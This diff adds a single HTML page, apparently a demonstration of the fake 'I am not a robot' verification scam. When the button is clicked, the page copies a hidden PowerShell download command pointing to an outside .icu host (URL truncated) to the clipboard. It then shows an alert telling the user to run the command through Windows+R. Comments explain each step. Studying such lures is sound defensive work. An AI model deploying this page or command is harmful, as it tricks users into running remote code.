@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Fake Verification Demo</title>
+    <style>
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f0f0; }
+        .btn { padding: 15px 30px; font-size: 16px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+    <!-- The scammer hides the trap behind a normal-looking button -->
+    <button class="btn" id="verifyBtn">I am not a robot</button>
+
+    <script>
+        document.getElementById('verifyBtn').addEventListener('click', () => {
+            // Because the user clicked, the browser allows this clipboard write
+            navigator.clipboard.writeText("powershell.exe -WindowStyle Hidden -Command iwr -Uri https://activatesoftinc.icu...").then(() => { 
+                // The alert pops up immediately after the clipboard is hijacked
+                alert("Verification failed. Please press Windows+R, then Ctrl+V, and press Enter to fix the error."); 
+            }).catch(err => {
+                console.log("Clipboard blocked anyway:", err);
+            });
+        });
+    </script>
+
+</body>
+</html>
